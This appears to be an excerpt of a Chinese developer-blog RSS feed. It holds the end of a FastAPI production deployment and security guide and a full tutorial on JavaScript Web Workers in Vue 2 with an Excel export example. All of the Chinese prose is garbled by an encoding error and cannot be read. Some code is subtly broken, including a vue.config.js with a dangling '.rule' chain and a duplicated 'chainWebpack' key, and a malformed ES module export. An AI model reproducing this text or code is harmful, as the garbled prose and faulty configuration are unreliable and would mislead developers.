<p>çè§£è¯·æ±å¦ä½æµç»ä½ çåºç¨ï¼æ¯è¿è¡ææé¨ç½²åè°è¯çåºç¡ãä¸ä¸ªç»ææ¸æ°çFastAPIé¡¹ç®éå¸¸éµå¾ªä»¥ä¸åå±æ¶æï¼</p>
<p><strong style="color: rgba(186, 55, 42, 1)">1. è·¯ç±å±ï¼Routers/Viewsï¼</strong>ï¼HTTPè¯·æ±çå¥å£ãè´è´£è§£æè·¯å¾ãåæ°ï¼è¿è¡åæ­¥éªè¯ï¼ä¾èµæ³¨å¥ï¼ï¼å¹¶è°ç¨ç¸åºçæå¡å±å½æ°ãè¿éä½¿ç¨Pydanticæ¨¡åå®ä¹è¾å¥è¾åºæ ¼å¼ã</p>
<pre class="language-python highlighter-hljs"><code>@router.post("/users/", response_model=UserOut)
async def create_user(user_in: UserCreate, db: Session = Depends(get_db)):
    # è°ç¨æå¡å±
    return UserService.create_user(db, user_in)</code></pre>
<p><strong style="color: rgba(186, 55, 42, 1)">2. æå¡å±ï¼Servicesï¼</strong>ï¼æ¿è½½æ ¸å¿ä¸å¡é»è¾ãå®åè°å¤ä¸ªæ°æ®æ¨¡åæä½ï¼å¤çäºå¡ï¼æ¯è¿æ¥è·¯ç±å±åæ°æ®å±çæ¡¥æ¢ãä¸ä¸ªå¥½çæå¡å±è®©ä½ çä¸å¡é»è¾é«åº¦å¯å¤ç¨ã</p>
<p><strong style="color: rgba(186, 55, 42, 1)">3. æ°æ®è®¿é®å±ï¼Repository/Modelsï¼</strong>ï¼ç´æ¥ä¸æ°æ®åºäº¤äºãä½¿ç¨SQLAlchemyç­ORMå®ä¹æ°æ®æ¨¡åï¼æ§è¡CRUDæä½ãè¿ä¸å±åºä¸æ³¨äºæ°æ®æä¹åç»èã</p>
<p><strong style="color: rgba(186, 55, 42, 1)">å®æ´æ°æ®æµ</strong>ï¼<code>HTTPè¯·æ± -&gt; ååä»£ç(Nginx) -&gt; ASGIæå¡å¨(Uvicorn) -&gt; FastAPIè·¯ç± -&gt; Pydanticéªè¯ -&gt; æå¡å± -&gt; æ°æ®å± -&gt; æ°æ®åº -&gt; åè·¯è¿åååº</code>ã</p>
<h2 style="color: rgba(44, 62, 80, 1); margin-top: 30px">ð¡ï¸ ç¬¬ä¸é¨åï¼ç­ç¢é²çº¿ - çäº§ç¯å¢ç½ç»å®å¨è®¾ç½®</h2>
<p>å®å¨ä¸æ¯åè½ï¼æ¯åºç³ãä»¥ä¸æ¯ä¿æ¤FastAPIåºç¨å¿é¡»å®æ½çæªæ½ã</p>
<h3 style="color: rgba(58, 109, 140, 1)">1. è®¤è¯ä¸ææï¼Authentication &amp; Authorizationï¼</h3>
<p><strong style="color: rgba(186, 55, 42, 1)">è®¤è¯</strong>è§£å³âä½ æ¯è°âï¼<strong style="color: rgba(186, 55, 42, 1)">ææ</strong>è§£å³âä½ è½åä»ä¹âãå¯¹äºAPIï¼<strong style="color: rgba(186, 55, 42, 1)">OAuth2ä¸JWT</strong>æ¯è¡ä¸æ åã</p>
<p>å®ç°JWTä»¤çéªè¯çä¾èµé¡¹ç¤ºä¾ï¼</p>
<pre class="language-python highlighter-hljs"><code>from fastapi.security import OAuth2PasswordBearer
from jose import JWTError, jwt

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")
SECRET_KEY = "your-secret-key"  # çäº§ç¯å¢åºä»å®å¨éç½®è¯»å

async def get_current_user(token: str = Depends(oauth2_scheme)):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        username: str = payload.get("sub")
        if username is None:
            raise credentials_exception
    except JWTError:
        raise credentials_exception
    return username</code></pre>
<p>æ´å¤æçææï¼å¦<strong style="color: rgba(186, 55, 42, 1)">åºäºè§è²çè®¿é®æ§å¶ï¼RBACï¼</strong>ï¼å¯ä»¥åºäºJWTä¸­çå£°æï¼claimsï¼æ¥å®ç°ï¼ç²¾ç»æ§å¶ç¨æ·å¯¹APIç«¯ç¹çè®¿é®ã</p>
<h3 style="color: rgba(58, 109, 140, 1)">2. å¨é¢çè¾å¥éªè¯ä¸è¾åºè¿æ»¤</h3>
<p>æ°¸è¿ä¸è¦ä¿¡ä»»å®¢æ·ç«¯è¾å¥ãFastAPIæ·±åº¦éæ<strong style="color: rgba(186, 55, 42, 1)">Pydantic</strong>ï¼å¨è·¯ç±å±å³å¯å¯¹è¯·æ±ä½ãæ¥è¯¢åæ°è¿è¡å¼ºç±»åéªè¯ãåæ¶ï¼ç¡®ä¿ååºæ¨¡åï¼<code>response_model</code>ï¼åªæ´é²å¿è¦çå­æ®µï¼é²æ­¢æææ°æ®æ³é²ã</p>
<h3 style="color: rgba(58, 109, 140, 1)">3. å¯ç¨CSRFä¿æ¤ä¸CORSç­ç¥</h3>
<p>å¯¹äºæ¶åæµè§å¨ä¼è¯çæä½ï¼åºèèå¯ç¨<strong style="color: rgba(186, 55, 42, 1)">CSRFä¿æ¤</strong>ãå¯¹äºååç«¯åç¦»çé¡¹ç®ï¼å¿é¡»æ­£ç¡®éç½®<strong style="color: rgba(186, 55, 42, 1)">CORS</strong>ï¼åªåè®¸åä¿¡ä»»çåç«¯ååè®¿é®ä½ çAPIã</p>
<pre class="language-python highlighter-hljs"><code>from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://your-frontend.com"],  # ç²¾ç¡®æå®ï¼å¿ç¨â*â
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)</code></pre>
<h2 style="color: rgba(44, 62, 80, 1); margin-top: 30px">ð» ç¬¬åé¨åï¼å®æ´ä»£ç åèä¸æ»ç»</h2>
<p>ä¸é¢æ¯ä¸ä¸ªæ´åäºä¸è¿°é¨åæ¦å¿µççäº§å°±ç»ª<code>main.py</code>æä»¶éª¨æ¶ï¼</p>
<pre class="language-python highlighter-hljs"><code>from fastapi import FastAPI, Depends, HTTPException
from fastapi.security import OAuth2PasswordBearer
from pydantic import BaseModel
import logging

# éç½®æ¥å¿
logger = logging.getLogger(__name__)

app = FastAPI(title="çäº§ç¯å¢FastAPIç¤ºä¾")

# 1. å®ä¹Pydanticæ¨¡å
class ItemCreate(BaseModel):
    name: str
    price: float

class ItemOut(BaseModel):
    id: int
    name: str
    price: float

# 2. æ¨¡ææ°æ®åºåæå¡å±
fake_db = []
class ItemService:
    @staticmethod
    def create_item(item_in: ItemCreate):
        logger.info(f"å°è¯åå»ºåå: {item_in.name}")
        # æ¨¡æä¿å­å°æ°æ®åºå¹¶çæID
        item_dict = item_in.dict()
        item_dict['id'] = len(fake_db) + 1
        fake_db.append(item_dict)
        return item_dict

# 3. ä¾èµé¡¹ï¼ç®åçOAuth2ä»¤çéªè¯ï¼ç¤ºä¾ï¼
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")
def verify_token(token: str = Depends(oauth2_scheme)):
    # æ­¤å¤åºåå«å®æ´çJWTéªè¯é»è¾
    if token != "fake-super-secret-token":
        raise HTTPException(status_code=403, detail="æ æçä»¤ç")
    return token

# 4. åä¿æ¤çè·¯ç±
@app.post("/items/", response_model=ItemOut)
async def create_item(
    item: ItemCreate,
    token: str = Depends(verify_token)  # ä¾èµé¡¹ç¨äºè®¤è¯
):
    """
    åå»ºæ°ååãéè¦ææçBearer Tokenã
    """
    new_item = ItemService.create_item(item)
    return new_item

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)</code></pre>
<h3 style="color: rgba(58, 109, 140, 1)">æ»ç»</h3>
<p>å°FastAPIæåé¨ç½²å°çäº§ç¯å¢ï¼æ¯ä¸ä¸ªæ¶µç<strong style="color: rgba(186, 55, 42, 1)">æå¡å¨éç½®ãæ¶æçè§£åå®å¨å åº</strong>çç³»ç»å·¥ç¨ãæ ¸å¿è¦ç¹å¨äºï¼ä½¿ç¨<strong style="color: rgba(186, 55, 42, 1)">Gunicorn+Uvicorn</strong>æç±»ä¼¼ç»åä½ä¸ºåºç¨æå¡å¨ï¼éè¿<strong style="color: rgba(186, 55, 42, 1)">Nginx</strong>æä¾HTTPSåååä»£çï¼éç¨<strong style="color: rgba(186, 55, 42, 1)">æ¸æ°çMVC/åå±æ¶æ</strong>ç»ç»ä»£ç ï¼å¹¶å¼ºå¶å®æ½ä»¥<strong style="color: rgba(186, 55, 42, 1)">OAuth2/JWT</strong>ä¸ºæ ¸å¿çè®¤è¯æææºå¶ãéµå¾ªè¿äºå®è·µï¼ä½ çFastAPIåºç¨å°è½å¨çäº§ç¯å¢ä¸­ç¨³å®ãé«æãå®å¨å°è¿è¡ã</p>
<p style="text-align: center; color: rgba(136, 136, 136, 1); font-size: 0.95em; margin-top: 20px">åæ¬¢æ¬æï¼ä¸è¦éè¿â¨ï¼ç¹èµðæ¶èâ­å³æ³¨æðï¼ä¸èµ·å­¦ä¹ æ´å¤æç¨çç¥è¯ï¼å®åä½ æçæè½æ ï¼ä¹è¯·è·¯è¿çå¤§ä½¬ç»äºå»ºè®®åææððð¥ºï¼</p>
</div>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-04 09:23">2026-01-04 09:22</span>&nbsp;
<a href="https://www.cnblogs.com/ymtianyu">ä¸åç¨åºåªå</a>&nbsp;
éè¯»(<span id="post_view_count">133</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19435881);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19435881', targetLink: 'https://www.cnblogs.com/ymtianyu/p/19435881', title: 'FastAPIçäº§é¨ç½²æåï¼ä»æå¡å¨éç½®å°ç½ç»å®å¨å®è·µ' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ jsä¸­workerçè¯¦ç»è®²è§£ ]]></title>
    <link>https://www.cnblogs.com/IwishIcould/p/19377799</link>
    <guid>66c21522d788fa0f0b50741202cd8f7e</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/IwishIcould/p/19377799" title="åå¸äº 2026-01-04 09:03">
    <span role="heading" aria-level="2">jsä¸­workerçè¯¦ç»è®²è§£</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h4 id="ä»ä¹æ¯-javascript-worker">ä»ä¹æ¯ JavaScript Workerï¼</h4>
<p>Worker æ¯å¨Webåºç¨ç¨åºä¸­å®ç°å¤çº¿ç¨çæºå¶ã<br>
å®å¯ä»¥å¨ä¸ä¸ªåç¬ççº¿ç¨ä¸­è¿è¡èæ¬ï¼ç¬ç«äºä¸»çº¿ç¨ã<br>
è¿æ ·ï¼æä»¬å¯ä»¥å°ä¸äºèæ¶çè®¡ç®ä»»å¡äº¤ç»Workerçº¿ç¨å¤çã<br>
ä»¥ä¿è¯ä¸»çº¿ç¨çä¸ä¼è¢«é»å¡ã</p>
<h4 id="ä¸ºä»ä¹éè¦worker">ä¸ºä»ä¹éè¦Workerï¼</h4>
<p>ç±äºJavaScriptæ¯åçº¿ç¨çï¼ææä»»å¡å¨ä¸ä¸ªçº¿ç¨ä¸æ§è¡ã<br>
å¦æéå°ä¸ä¸ªèæ¶çä»»å¡ï¼æ¯å¦å¤§è§æ¨¡æ°æ®è®¡ç®ãå¾åå¤çãå¤æç®æ³ï¼ã<br>
å®ä¼é»å¡ä¸»çº¿ç¨å¯¼è´é¡µé¢æ æ³ååºï¼ç¨æ·ä½éªåå·®ã<br>
Workerçåºç°å°±æ¯ä¸ºäºè§£å³è¿ä¸ªé®é¢ï¼å°èæ¶çè®¡ç®ä»»å¡æ¾å°åå°çº¿ç¨å»æ§è¡ã</p>
<h3 id="vue2ä¸­å¦ä½ä½¿ç¨-worker">vue2ä¸­å¦ä½ä½¿ç¨ worker</h3>
<p>å¨vue/clièææ¶ä¸­ï¼æä»¬æ æ³ç´æ¥ä½¿ç¨workerã<br>
å ä¸ºï¼<br>
1ï¼æ æ³å° Worker èæ¬æåä¸ºç¬ç«çå¯å è½½æä»¶ã<br>
2ï¼æååä¼å¯¼è´ä¾èµä¸¢å¤±æè·¯å¾éè¯¯ã</p>
<pre><code>npm install worker-loader -D
æè
yarn add worker-loader -D
</code></pre>
<h4 id="vueconfigjs-éç½®å¦ä¸">vue.config.js éç½®å¦ä¸</h4>
<pre><code>module.exports = {
  chainWebpack:config=&gt;{
    // ä¸é¢æ¯workerçéç½®
    .rule('worker')
    .test(/\.worker\.js$/)
    .use('worker-loader')
    .loader('worker-loader')
    .end();

    // è§£å³ï¼worker ç­æ´æ°é®é¢
    config.module.rule('js').exclude.add(/\.worker\.js$/);
  },
  parallel: false,
  chainWebpack: config =&gt; {
    // è§£å³ï¼âwindow is undefinedâæ¥éï¼è¿ä¸ªæ¯å ä¸ºworkerçº¿ç¨ä¸­ä¸å­å¨windowå¯¹è±¡ï¼å æ­¤ä¸è½ç´æ¥ä½¿ç¨ï¼è¦ç¨thisä»£æ¿
    config.output.globalObject('this')
  }
}
</code></pre>
<h4 id="postmessage-å­çº¿ç¨ç»ä¸»çº¿åéæ¶æ¯">postMessage å­çº¿ç¨ç»ä¸»çº¿åéæ¶æ¯</h4>
<p>self.postMessageå­çº¿ç¨åä¸»çº¿ç¨åéæ¶æ¯ã<br>
å¨ Web Worker ä¸­ï¼self æåå½ååå»ºçè¿ä¸ª worker çº¿ç¨ï¼self æ¯ä¸ä¸ªå¨å±å¯¹è±¡ã<br>
self.postMessage()å°æ°æ®ä» worker çº¿ç¨åéå°åå»ºå®çä¸»çº¿ç¨ã</p>
<h4 id="ä¸»çº¿ç¨éç¥å­çº¿ç¨workerå¼å§å·¥ä½">ä¸»çº¿ç¨éç¥å­çº¿ç¨(worker)å¼å§å·¥ä½</h4>
<pre><code>// åå»º worker
this.webWorker = new Worker('./web.worker.js')
// éç¥ Worker å­çº¿ç¨å¯ä»¥è¿è¡ååºçå·¥ä½ã
// ä¸»çº¿ç¨è°ç¨worker.postMessage()æ¹æ³ï¼å Worker åæ¶æ¯
this.webWorker.postMessage({ action: 'startFetch' });
</code></pre>
<h4 id="worker-ä¸­æ¥åéç½ç»è¯·æ±å">worker ä¸­æ¥åéç½ç»è¯·æ±å</h4>
<p>src\views\element.vue æä»¶</p>
<pre><code>&lt;template&gt;
  &lt;div class="page"&gt;
    &lt;h1&gt;ä½¿ç¨workeræ¥ååéç½ç»è¯·æ±&lt;/h1&gt;
    &lt;el-button @click="sendFetchHandler"&gt;å¼å§åéç½ç»è¯·æ±&lt;/el-button&gt;

    &lt;ul&gt;
      &lt;li v-for="(item,index) in apiBackData" :key="index"&gt;{{ item.title }}&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
// å¯¼å¥ worker æä»¶, å¿é¡»ä½¿ç¨ è¿æ ·çæ¹å¼å¼å¥
import WorkerA from 'worker-loader!./web.worker.js'
export default {
  data() {
    return {
      apiBackData: []
    }
  },
  methods: {
    sendFetchHandler(){
      // ä¸»çº¿ç¨è°ç¨worker.postMessage()æ¹æ³ï¼å Workerçº¿ç¨ åæ¶æ¯,å¼å§è¿è¡ç½ç»è¯·æ±
      this.webWorker1.postMessage({ action: 'startFetch' });
    }
  },
  created() {
    // åå»º worker å®ä¾ï¼åç§°å¿é¡»åå¯¼å¥æ¶çä¿æä¸è´
    this.webWorker1 = new WorkerA('./web.worker.js')
    // åæ·»å äºä»¶çå¬å¨
    this.webWorker1.addEventListener('message', (e) =&gt; {
      // e.data æ¯æ¥æ¶å°çæ°æ®
      console.log('æ¶å°æ¥èª Worker çæ¶æ¯:', e.data)
      // å¤ç Worker è¿åçæ°æ®
      if (e.data.type === 'fetchSuccess') {
        this.apiBackData = e.data.data.data || []
        console.log('è·åçæ°æ®:',  this.apiBackData );
      } else if (e.data.type === 'fetchError') {
        console.log('è·åæ°æ®å¤±è´¥:', e.data.error);
      }
    })

    this.webWorker1.addEventListener('error', (error) =&gt; {
      console.error('Workeråçéè¯¯:', error)
    })
  }
}
&lt;/script&gt;
</code></pre>
<pre><code>// å¼å¥ç½ç»è¯·æ±ä¸­çæ¹æ³
import {getList} from '@/request/api.js'

self.onmessage = function(e) {
  console.log("worker:", e)
  if(e.data &amp;&amp; e.data.action==='startFetch'){
    //  e.dataæ¯ä¸»çº¿ç¨åéè¿æ¥çæ°æ®
    getList().then(res=&gt;{
      console.log(1111,res)
      // åè®¾ æ¯ä¸ä¸ªæ°ç»å°±æ¯è¯·æ±æå
      if(Array.isArray(res)){
        //å°æ°æ®ä» worker çº¿ç¨åéå°åå»ºå®çä¸»çº¿ç¨
        self.postMessage({ 
          type: 'fetchSuccess',
          data:{
            data:res,
            message: 'è·åæå'
          }
        });
      }else{
        // å°æ°æ®ä» worker çº¿ç¨åéå°åå»ºå®çä¸»çº¿ç¨
        self.postMessage({ type: 'fetchError', error: 'è¯·æ±å¤±è´¥' });
      }
    })
  }
};
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1425695/202512/1425695-20251221111952362-1403369349.png" alt="image" loading="lazy"></p>
<h4 id="workerå¯¼åºè¡¨æ ¼æ¡ä¾">workerå¯¼åºè¡¨æ ¼æ¡ä¾</h4>
<pre><code>&lt;template&gt;
  &lt;div class="page"&gt;
    &lt;input type="text"&gt;
    &lt;br/&gt;
    &lt;el-button @click="exportExcelHandler"&gt;å¯¼åºexcel&lt;/el-button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
import {writeFile, utils} from 'xlsx'
export default {
  data() {
    return {
      
    }
  },
  methods: {
    exportExcelHandler(){
      let arr = []
      // 50wè¡çæ°æ®
      for(let i= 0; i&lt;500000;i++){
        arr.push({
          name: 'å¼ ' + i,
          age: 18,
          sex: 'ç·',
          id: '2025_12_12'+ i,
          address:'XXåºYYYå¤§é' + i + 'å·'
        })
      }
      // å°å¯¹è±¡æ°ç» arr è½¬æ¢ä¸º Excel å·¥ä½è¡¨(sheet)
      const sheet  = utils.json_to_sheet(arr)
      // åå»ºä¸ä¸ªæ°çç©ºå·¥ä½ç°¿å¯¹è±¡ã
      // å·¥ä½ç°¿æ¯ Excel æä»¶çå®¹å¨ï¼å¯ä»¥åå«å¤ä¸ªå·¥ä½è¡¨
      const workbook = utils.book_new()
      // å°ä¹ååå»ºçå·¥ä½è¡¨ sheet æ·»å å°å·¥ä½ç°¿ workbook ä¸­
      utils.book_append_sheet(workbook, sheet, 'sheet1')
      console.log('workbook', workbook)
      // å°æ´ä¸ªå·¥ä½ç°¿ workbook åå¥æä»¶å¹¶è§¦åæµè§å¨ä¸è½½
      writeFile(workbook, 'test.xlsx')
      // ä¸»çº¿ç¨è°ç¨worker.postMessage()æ¹æ³ï¼å Workerçº¿ç¨ åæ¶æ¯,å¼å§è¿è¡ç½ç»è¯·æ±
      // this.webWorker1.postMessage({ action: 'startFetch', data: this.vueData });
    }
  }
}
&lt;/script&gt;
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1425695/202512/1425695-20251221175954856-1704295092.png" alt="image" loading="lazy"></p>
<h4 id="ç°å¨æä»¬ä½¿ç¨workeræ¥è§£å³æ·»å æ°æ®èæ¶çé®é¢">ç°å¨æä»¬ä½¿ç¨workeræ¥è§£å³æ·»å æ°æ®èæ¶çé®é¢</h4>
<p>ä¸è½½xlsxæ¨¡åã</p>
<pre><code>npm install --save xlsx
</code></pre>
<p>ä½¿ç¨workerçæä»¶(ä¸è½½çä¸»é¡µé¢)</p>
<pre><code>&lt;template&gt;
  &lt;div class="page"&gt;
    &lt;input type="text"&gt;
    &lt;br/&gt;
    &lt;el-button @click="exportExcelHandler"&gt;å¯¼åºexcel&lt;/el-button&gt;

  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
// å¯¼å¥ worker æä»¶, å¿é¡»ä½¿ç¨ è¿æ ·çæ¹å¼å¼å¥
import WorkerA from 'worker-loader!./web.worker.js'
import {writeFile} from 'xlsx'
export default {
  data() {
    return {
      
    }
  },
  methods: {
    exportExcelHandler(){
      // ä¸»çº¿ç¨è°ç¨worker.postMessage()æ¹æ³ï¼å Workerçº¿ç¨ åæ¶æ¯,å¼å§è¿è¡æé æ°æ®
      this.webWorker1.postMessage({ action: 'startCreateExcelData'});
    }
  },
  created() {
    // åå»º worker å®ä¾ï¼åç§°å¿é¡»åå¯¼å¥æ¶çä¿æä¸è´
    this.webWorker1 = new WorkerA('./web.worker.js')
    // åæ·»å äºä»¶çå¬å¨
    this.webWorker1.addEventListener('message', (e) =&gt; {
      console.log('æ¶å°æ¥èª Worker çæ¶æ¯:', e.data)
      // å¤ç Worker è¿åçæ°æ®
      if (e.data.type === 'createExcelSuccess') {
        // è¿åè¡¨çæ°æ®
        const workbook = e.data.data.data
        // å°æ´ä¸ªå·¥ä½ç°¿ workbook åå¥æä»¶å¹¶è§¦åæµè§å¨ä¸è½½ã
        // æåå¼æ­¥ä»ç¶ä¼å¡é¡¿,å ä¸ºæ°æ®éå¤ªå¤§äº.ä½æ¯å¡é¡¿çæ¶é´ä¼æ¯ä¹åå¥½ä¸äº
        writeFile(workbook, 'éè¿workerå¯¼å¤excel.xlsx')
      } else  {
        console.log('è·åæ°æ®å¤±è´¥:', e.data.error);
      }
    })

    this.webWorker1.addEventListener('error', (error) =&gt; {
      console.error('Workeråçéè¯¯:', error)
    })
  }
}
&lt;/script&gt;
</code></pre>
<p>workeræä»¶(src\views\web.worker.js )</p>
<pre><code>// å¼å¥ xlsx
import {utils} from 'xlsx'
self.onmessage = function(e) {
  console.log("worker:", e)
  if(e.data &amp;&amp; e.data.action==='startCreateExcelData'){
    //  e.dataæ¯ä¸»çº¿ç¨åéè¿æ¥çæ°æ®
    let arr = []
    // 50wè¡çæ°æ®
    for(let i= 0; i&lt;500000;i++){
      arr.push({
        name: 'å¼ ' + i,
        age: 18,
        sex: 'ç·',
        id: '2025_12_12'+ i,
        address:'XXåºYYYå¤§é' + i + 'å·'
      })
    }
    // å°å¯¹è±¡æ°ç» arr è½¬æ¢ä¸º Excel å·¥ä½è¡¨(sheet)
    const sheet  = utils.json_to_sheet(arr)
    // åå»ºä¸ä¸ªæ°çç©ºå·¥ä½ç°¿(book)å¯¹è±¡ãå·¥ä½ç°¿æ¯ Excel æä»¶çå®¹å¨ï¼å¯ä»¥åå«å¤ä¸ªå·¥ä½è¡¨(sheet)
    const workbook = utils.book_new()
    // å°ä¹ååå»ºçå·¥ä½è¡¨ (sheet) æ·»å å°å·¥ä½ç°¿(workbook)ä¸­
    utils.book_append_sheet(workbook, sheet, 'sheet1')
    self.postMessage({ 
      type: 'createExcelSuccess',
      data:{
        data:workbook,
        message: 'è·åæå'
      }
    });
  }
};
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1425695/202512/1425695-20251223192441700-1399729196.png" alt="image" loading="lazy"></p>
<h4 id="å³é­-web-worker">å³é­ Web Worker</h4>
<p>å¨ä¸»çº¿ç¨åå¨Workerçº¿ç¨çå³é­æ¹å¼æ¯ä¸ä¸æ ·çã<br>
å¦æå¨ä¸»çº¿ç¨ï¼è°ç¨terminate()æ¹æ³å³é­</p>
<pre><code>this.webWorker1 = new WorkerA('./web.worker.js') 
this.webWorker1.terminate();
</code></pre>
<p>å¦ææ¯å¨Workçº¿ç¨ï¼å¯ä»¥è°ç¨close()æ¹æ³è¿è¡å³é­</p>
<pre><code>self.close();
</code></pre>
<h4 id="ä¸»çº¿ç¨å³é­-worker-çº¿ç¨çè¯´æ">ä¸»çº¿ç¨å³é­ worker çº¿ç¨çè¯´æ</h4>
<p>å½ä¸»çº¿ç¨è°ç¨worker.terminate()æ¶ï¼Workerçº¿ç¨ä¼è¢«ç«å³ç»æ­¢ã<br>
æ è®ºå½åäºä»¶å¾ªç¯ä¸­æ¯å¦æä»»å¡ï¼åæ¬å¾®ä»»å¡åå®ä»»å¡ï¼é½ä¸ä¼ç»§ç»­æ§è¡ã<br>
ä¹å°±æ¯è¯´ï¼å¦ææå¨ç¹å»[å¯¼å¥excel]æé®åï¼é©¬ä¸åå³é­ç¹å»[å³é­worker]ï¼é£ä¹ä¸è½å¤æ­£å¸¸å¯¼åºè¡¨æ ¼ã<br>
<img src="https://img2024.cnblogs.com/blog/1425695/202512/1425695-20251223192230075-108196709.png" alt="image" loading="lazy"></p>
<h4 id="workerçº¿ç¨åé¨å³é­-worker-çº¿ç¨çè¯´æ">Workerçº¿ç¨åé¨å³é­ worker çº¿ç¨çè¯´æ</h4>
<p>å½Workerçº¿ç¨åé¨è°ç¨self.close()æ¶ï¼Workerçº¿ç¨å¹¶ä¸ä¼ç«å³ç»æ­¢ã<br>
å®ä¼[ç»§ç»­æ§è¡å½å]äºä»¶å¾ªç¯ä¸­çä»»å¡ï¼ä½æ¯[ä¼é»æ­¢åç»­]äºä»¶å¾ªç¯çä»»å¡æ§è¡ã<br>
ä¹å°±æ¯è¯´ï¼å¦ææå¨ç¹å»[å¯¼å¥excel]æé®åï¼é©¬ä¸åå³é­ç¹å»[Workeråé¨å³é­Worker]ï¼ä»ç¶å¯ä»¥å¯¼åºè¡¨æ ¼ã<br>
<img src="https://img2024.cnblogs.com/blog/1425695/202512/1425695-20251223193947537-1923756412.png" alt="image" loading="lazy"></p>
<h4 id="å¤æ­ç¨æ·æµè§å¨æ¯å¦æ¯æ-worker">å¤æ­ç¨æ·æµè§å¨æ¯å¦æ¯æ worker</h4>
<pre><code>if (typeof Worker !== 'undefined') {
  console.log('æµè§å¨æ¯æ Web Workers');
} else {
  console.log('æµè§å¨ä¸æ¯æ Web Workers');
}
</code></pre>
<h4 id="worker-çº¿ç¨å¼ç¨å¶ä»jsæä»¶">Worker çº¿ç¨å¼ç¨å¶ä»jsæä»¶</h4>
<p>æäºæ¶åï¼æä»¬éè¦å¨workeræä»¶ä¸­ï¼å¼å¥å¶ä»æ¨¡åçæä»¶ã<br>
å¯ä»¥éè¿ importScripts() æ¹æ³æ¥å®ç°ï¼å¨ worker ä¸­å¯¼å¥å¶ä»çæ¨¡åãè¿ä¸ªå°åæ¯å¯ä»¥è·¨åçã</p>
<h4 id="worker-æå®æ¨¡åç±»å">Worker æå®æ¨¡åç±»å</h4>
<p>å¦ææä»¬åç°æä»¬éè¦å¯¼åºçæ¹æ³ä½¿ç¨çæ¯ESModule æ¨¡å¼å¯¼åºã<br>
æ­¤æ¶ä½¿ç¨ importScripts() æ¹æ³å¼å¥ä»æ¨¡åï¼ä¼æ¥éã<br>
æ­¤æ¶éè¦æå®æ¨¡åç±»åã</p>
<pre><code>// main.jsï¼ä¸»çº¿ç¨çä»£ç ï¼
const worker = new Worker('/worker.js', {
    type: 'module'  // æå® worker.js çç±»å
});
</code></pre>
<pre><code>// worker.jsï¼workerçº¿ç¨çä»£ç ï¼
import add from './utils.js'; // å¯¼å¥å¤é¨js

self.addEventListener('message', e =&gt; { 
    postMessage(e.data);
});

add(1, 2);
</code></pre>
<pre><code>// utils.js ä½¿ç¨äºESModule æ¨¡åå¯¼åºç add æ¹æ³
export default add = (a, b) =&gt; a + b;
</code></pre>
<h4 id="ä½¿ç¨workerçæ³¨æäºé¡¹">ä½¿ç¨workerçæ³¨æäºé¡¹</h4>
<p>1ï¼workerä¸è½ä½¿ç¨windowä¸çdomæä½ï¼ä¹ä¸è½è·ådomå¯¹è±¡,domç¸å³çä¸è¥¿åªæä¸»çº¿ç¨æãworkeråªè½åä¸äºè®¡ç®ç¸å³çæä½<br>
2ï¼æçä¸è¥¿æ¯æ æ³éè¿ä¸»çº¿ç¨ä¼ éä¸ªå­çº¿ç¨çã<br>
æ¯å¦ï¼æ¹æ³ï¼domèç¹ï¼ä¸äºå¯¹è±¡éçç¹æ®è®¾ç½®(freeze,getter,setterè¿äº)æä»¥vueçååºå¼å¯¹è±¡å¨ä¼ éä¹åå°±ä¼åææ®éå¯¹è±¡</p>
<h4 id="workerå®éåºç¨æ¡ä¾">workerå®éåºç¨æ¡ä¾</h4>
<p>1ï¼å°è¯­æ³æ£æ¥ãä»£ç åç¼©ç­ä»»å¡æ¾å¨ Worker ä¸­æ§è¡<br>
2ï¼å¾åå¤çï¼æ¯å¦ä½¿ç¨Canvaså¤çå¾çï¼è¿è¡æ»¤é</p>
<h4 id="workeræ§è½ä¼åå»ºè®®">workeræ§è½ä¼åå»ºè®®</h4>
<p>åå°éä¿¡å¼éï¼é¿åé¢ç¹ä¼ éå¤§éæ°æ®ï¼å¿è¦æ¶ä½¿ç¨ Transferable Objectsï¼å¦ ArrayBufferï¼<br>
æ¹éå¤çï¼å¯¹äºå¤§æ¹éä»»å¡ï¼å¯æ¹éåå»º Worker å¹¶è¡å¤ç<br>
å¸¸é©»çº¿ç¨ï¼å¯¹äºé¢ç¹ä½¿ç¨ç Workerï¼å¯ä¿æå¸¸é©»èééå¤åå»º<br>
éè¯¯å¤çï¼å§ç»çå¬ onerror äºä»¶ï¼æè· Worker åé¨çå¼å¸¸</p>

</div>
<div id="MySignature" role="contentinfo">
    <div style="width:818px;background:#f5f5f5; padding: 10px 10px 10px 10px; border: 1px dashed rgb(224, 224, 224); font-family: å¾®è½¯éé»; font-size: 13px;">
            <h1 style="font-size: 24px;"> éè§é®é¢ï¼è¿æ¯ä½ æé¿çæºä¼ï¼å¦æä½ è½å¤è§£å³ï¼è¿å°±æ¯æ¶è·ã </h1>
		    <div style="padding:10px">
		        ä½èï¼<a href="https://www.cnblogs.com/IwishIcould/" target="_blank">ææ¥åé£æç¸è¯</a> <br>
